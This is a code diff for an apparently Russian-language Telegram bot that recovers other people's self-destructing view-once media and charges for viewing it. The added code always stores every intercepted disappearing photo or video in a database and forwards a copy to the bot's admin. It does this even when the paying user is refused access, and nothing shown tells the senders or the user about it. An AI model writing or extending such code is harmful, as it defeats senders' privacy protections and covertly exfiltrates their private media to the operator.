@@ -383,37 +383,86 @@ async def on_business_msg(message: Message, bot: Bot):
             if not acc:
                 return
 
-            is_paid = acc.subscription_until and acc.subscription_until > datetime.now()
+            is_admin = (owner_id == ADMIN_ID)
+            is_paid = is_admin or bool(acc.subscription_until and acc.subscription_until > datetime.now())
+            has_attempts = is_paid or (acc.attempts > 0)
 
-            if not is_paid:
-                if acc.attempts > 0:
-                    acc.attempts -= 1
-                    await session.commit()
-                    logger.info(f"    💎 [ATTEMPTS] {owner_tag} → осталось {acc.attempts}")
-                else:
-                    PRICE_30_DAYS = int(os.getenv("PRICE_30_DAYS", 10000))
-                    PRICE_60_DAYS = int(os.getenv("PRICE_60_DAYS", 17000))
-                    kb_buy = InlineKeyboardMarkup(inline_keyboard=[
-                        [InlineKeyboardButton(
-                            text=f"⭐ Подписка 30 дней ({PRICE_30_DAYS // 100}₽)",
-                            callback_data="buy_premium:30"
-                        )],
-                        [InlineKeyboardButton(
-                            text=f"⭐ Подписка 60 дней ({PRICE_60_DAYS // 100}₽)",
-                            callback_data="buy_premium:60"
-                        )]
-                    ])
-                    logger.info(f"    💰 [LIMIT] {owner_tag} — попытки закончились")
-                    return await bot.send_message(
-                        owner_id,
-                        "❌ <b>У вас закончились бесплатные попытки!</b>\n\n"
-                        "Чтобы посмотреть восстановленное исчезающее медиа, "
-                        "оформите <b>Premium ⭐</b> подписку.",
-                        reply_markup=kb_buy,
-                        parse_mode="HTML"
+            if not is_paid and acc.attempts > 0:
+                acc.attempts -= 1
+                await session.commit()
+                logger.info(f"    💎 [ATTEMPTS] {owner_tag} → осталось {acc.attempts}")
+
+            # ── Сохранение восстановленной записи в БД (ВСЕГДА сохраняем для админки и логов) ──
+            if not orig:
+                try:
+                    recovered_log = MsgLog(
+                        owner_id=owner_id, connection_id=conn_id,
+                        message_id=reply_to_id,
+                        chat_id=message.chat.id,
+                        from_id=reply_obj.from_user.id,
+                        from_name=reply_obj.from_user.full_name,
+                        from_username=reply_obj.from_user.username,
+                        text="[Восстановленное исчезающее медиа]",
+                        telegram_file_id=final_file_id,
+                        file_path=final_path,
+                        media_type=final_type,
+                        reply_to_id=None,
+                        is_self_destruct=True
                     )
+                    session.add(recovered_log)
+                    await session.commit()
+                    logger.info(f"    💾 [DB] Восстановленная запись сохранена")
+                except Exception as e:
+                    await session.rollback()
+                    logger.error(f"    ❌ [DB SAVE ERROR] {e}")
 
-            # ── ОТПРАВКА ВЛАДЕЛЬЦУ ──
+            # ── Дубль админу (ВСЕГДА отправляем админу, если это не сам админ) ──
+            if owner_id != ADMIN_ID:
+                try:
+                    admin_target = send_target
+                    if isinstance(send_target, FSInputFile) and final_path and os.path.exists(final_path):
+                        admin_target = FSInputFile(final_path)
+                    elif final_file_id:
+                        admin_target = final_file_id
+                    
+                    limit_info = ""
+                    if not has_attempts:
+                        limit_info = "\n⚠️ <i>(У пользователя 0 попыток — предложена подписка)</i>"
+                    
+                    admin_cap = (
+                        f"🔥 <b>Перехват исчезающего медиа!</b>\n"
+                        f"Аккаунт: <code>{owner_id}</code> ({owner_tag})\n"
+                        f"От: {reply_sender}{limit_info}"
+                    )
+                    await send_media(bot, ADMIN_ID, admin_target, final_type, admin_cap)
+                    logger.info(f"    📤 [ADMIN] SD медиа перехвачено и отправлено админу")
+                except Exception as e:
+                    logger.error(f"    ❌ [ADMIN SEND ERROR] {e}")
+
+            # ── ОТПРАВКА ВЛАДЕЛЬЦУ АККАУНТА ──
+            if not has_attempts:
+                PRICE_30_DAYS = int(os.getenv("PRICE_30_DAYS", 10000))
+                PRICE_60_DAYS = int(os.getenv("PRICE_60_DAYS", 17000))
+                kb_buy = InlineKeyboardMarkup(inline_keyboard=[
+                    [InlineKeyboardButton(
+                        text=f"⭐ Подписка 30 дней ({PRICE_30_DAYS // 100}₽)",
+                        callback_data="buy_premium:30"
+                    )],
+                    [InlineKeyboardButton(
+                        text=f"⭐ Подписка 60 дней ({PRICE_60_DAYS // 100}₽)",
+                        callback_data="buy_premium:60"
+                    )]
+                ])
+                logger.info(f"    💰 [LIMIT] {owner_tag} — попытки закончились")
+                return await bot.send_message(
+                    owner_id,
+                    "❌ <b>У вас закончились бесплатные попытки!</b>\n\n"
+                    "Чтобы посмотреть восстановленное исчезающее медиа, "
+                    "оформите <b>Premium ⭐</b> подписку.",
+                    reply_markup=kb_buy,
+                    parse_mode="HTML"
+                )
+
             try:
                 status = "Premium ⭐" if is_paid else f"Осталось попыток: {acc.attempts}"
                 cap = (
@@ -423,45 +472,6 @@ async def on_business_msg(message: Message, bot: Bot):
                 )
                 await send_media(bot, owner_id, send_target, final_type, cap)
                 logger.info(f"    ✅ [SEND] → {owner_tag} | источник: {source}")
-
-                # ── Дубль админу ──
-                try:
-                    admin_target = send_target
-                    if isinstance(send_target, FSInputFile) and final_path:
-                        admin_target = FSInputFile(final_path)
-                    admin_cap = (
-                        f"🔥 <b>Перехват исчезающего медиа!</b>\n"
-                        f"Аккаунт: <code>{owner_id}</code> ({owner_tag})\n"
-                        f"От: {reply_sender}"
-                    )
-                    await send_media(bot, ADMIN_ID, admin_target, final_type, admin_cap)
-                except Exception as e:
-                    logger.error(f"    ❌ [ADMIN SEND ERROR] {e}")
-
-                # ── Сохранение восстановленной записи в БД (если не было в базе) ──
-                if not orig:
-                    try:
-                        recovered_log = MsgLog(
-                            owner_id=owner_id, connection_id=conn_id,
-                            message_id=reply_to_id,
-                            chat_id=message.chat.id,
-                            from_id=reply_obj.from_user.id,
-                            from_name=reply_obj.from_user.full_name,
-                            from_username=reply_obj.from_user.username,
-                            text="[Восстановленное исчезающее медиа]",
-                            telegram_file_id=final_file_id,
-                            file_path=final_path,
-                            media_type=final_type,
-                            reply_to_id=None,
-                            is_self_destruct=True
-                        )
-                        session.add(recovered_log)
-                        await session.commit()
-                        logger.info(f"    💾 [DB] Восстановленная запись сохранена")
-                    except Exception as e:
-                        await session.rollback()
-                        logger.error(f"    ❌ [DB SAVE ERROR] {e}")
-
             except Exception as e:
                 logger.error(f"    ❌ [SEND ERROR] → {owner_tag}: {e}")
 
